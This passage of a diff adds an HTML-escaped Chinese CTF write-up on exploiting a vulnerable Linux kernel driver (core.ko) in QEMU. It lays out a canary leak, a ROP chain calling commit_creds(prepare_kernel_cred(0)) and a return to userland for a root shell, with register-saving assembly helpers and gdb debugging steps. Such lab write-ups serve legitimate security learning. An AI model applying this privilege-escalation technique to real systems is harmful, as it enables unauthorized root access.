+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xFFFFFFF2LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h4 id=&#34;思路-1&#34;&gt;思路&lt;/h4&gt;
+
+&lt;p&gt;经过如上的分析，可以得出以下的思路：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;通过 ioctl 设置 off，然后通过 core_read() leak 出 canary&lt;/li&gt;
+&lt;li&gt;通过 core_write() 向 name 写，构造 ropchain&lt;/li&gt;
+&lt;li&gt;通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop&lt;/li&gt;
+&lt;li&gt;通过 rop 执行 &lt;code&gt;commit_creds(prepare_kernel_cred(0))&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;返回用户态，通过 system(&amp;ldquo;/bin/sh&amp;rdquo;) 等起 shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;解释一下：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;如何获得 commit_creds()，prepare_kernel_cred() 的地址？
+
+&lt;ul&gt;
+&lt;li&gt;/tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;如何返回用户态？&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;swapgs; iretq&lt;/code&gt;，之前说过需要设置 &lt;code&gt;cs, rflags&lt;/code&gt; 等信息，可以写一个函数保存这些信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// intel flavor assembly
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_cs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_ss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_rflags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;save_status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;__asm__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_cs, cs;&amp;#34;&lt;/span&gt;
+            &lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_ss, ss;&amp;#34;&lt;/span&gt;
+            &lt;span class=&#34;s&#34;&gt;&amp;#34;mov user_sp, rsp;&amp;#34;&lt;/span&gt;
+            &lt;span class=&#34;s&#34;&gt;&amp;#34;pushf;&amp;#34;&lt;/span&gt;
+            &lt;span class=&#34;s&#34;&gt;&amp;#34;pop user_rflags;&amp;#34;&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;[*]status has been saved.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// at&amp;amp;t flavor assembly
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;save_stats&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+    &lt;span class=&#34;s&#34;&gt;&amp;#34;movq %%cs, %0&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+    &lt;span class=&#34;s&#34;&gt;&amp;#34;movq %%ss, %1&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+    &lt;span class=&#34;s&#34;&gt;&amp;#34;movq %%rsp, %3&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+    &lt;span class=&#34;s&#34;&gt;&amp;#34;pushfq&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+    &lt;span class=&#34;s&#34;&gt;&amp;#34;popq %2&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_cs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_ss&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_eflags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_sp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Why bother returning to Userspace?&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Most useful things we want to do are much easier from userland.&lt;/li&gt;
+&lt;li&gt;In KernelSpace, there’s no easy way to:
+
+&lt;ul&gt;
+&lt;li&gt;Modify the filesystem&lt;/li&gt;
+&lt;li&gt;Create a new process&lt;/li&gt;
+&lt;li&gt;Create network connections&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;exploit-1&#34;&gt;Exploit&lt;/h4&gt;
+
+&lt;p&gt;先说一下怎么调试，qemu 内置有 gdb 的接口，通过 help 查看&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; qemu-system-x86_64 --help &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep gdb
+-gdb dev        &lt;span class=&#34;nb&#34;&gt;wait&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gdb connection on &lt;span class=&#34;s1&#34;&gt;&amp;#39;dev&amp;#39;&lt;/span&gt;
+-s              shorthand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; -gdb tcp::1234&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;即可以通过 &lt;code&gt;-gdb tcp:port&lt;/code&gt; 或者 &lt;code&gt;-s&lt;/code&gt; 来开启调试端口，&lt;code&gt;start.sh&lt;/code&gt; 中已经有了 &lt;code&gt;-s&lt;/code&gt;，不必再自己设置。&lt;/p&gt;
+
+&lt;p&gt;另外通过 &lt;code&gt;gdb ./vmlinux&lt;/code&gt; 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 &lt;code&gt;core.ko&lt;/code&gt; 的符号表，可以通过 &lt;code&gt;add-symbol-file core.ko textaddr&lt;/code&gt; 加载&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; add-symbol-file
+Load symbols from FILE, assuming FILE has been dynamically loaded.
+Usage: add-symbol-file FILE ADDR &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-s &amp;lt;SECT&amp;gt; &amp;lt;SECT_ADDR&amp;gt; -s &amp;lt;SECT&amp;gt; &amp;lt;SECT_ADDR&amp;gt; ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+ADDR is the starting address of the file&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s text.
+The optional arguments are section-name section-address pairs and
+should be specified &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; the data and bss segments are not contiguous
+with the text.  SECT is a section name to be loaded at SECT_ADDR.&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;.text 段的地址可以通过 &lt;code&gt;/sys/modules/core/section/.text&lt;/code&gt; 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 &lt;code&gt;init&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# setsid /bin/cttyhack setuidgid 1000 /bin/sh
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;setsid /bin/cttyhack setuidgid &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; /bin/sh&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;重新打包，这样启动的时候就是 root 权限了。&lt;/p&gt;
+
+&lt;p&gt;比如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;154
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;155
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;156
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;157
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;158
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;159
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;160
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;161
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;// qemu 内
+/ &lt;span class=&#34;c1&#34;&gt;# cat /sys/module/core/sections/.text 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;0xffffffffc018b000
+......
+......
+
+// qemu 外
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; gdb ./vmlinux -q
+pwndbg: loaded &lt;span class=&#34;m&#34;&gt;174&lt;/span&gt; commands. Type pwndbg &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;filter&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a list.
+pwndbg: created &lt;span class=&#34;nv&#34;&gt;$rebase&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$ida&lt;/span&gt; gdb functions &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;can be used with print/break&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Reading symbols from ./vmlinux...&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;...done.
+pwndbg&amp;gt; add-symbol-file ./core.ko 0xffffffffc018b000
+add symbol table from file &lt;span class=&#34;s2&#34;&gt;&amp;#34;./core.ko&amp;#34;&lt;/span&gt; at
+	.text_addr &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 0xffffffffc018b000
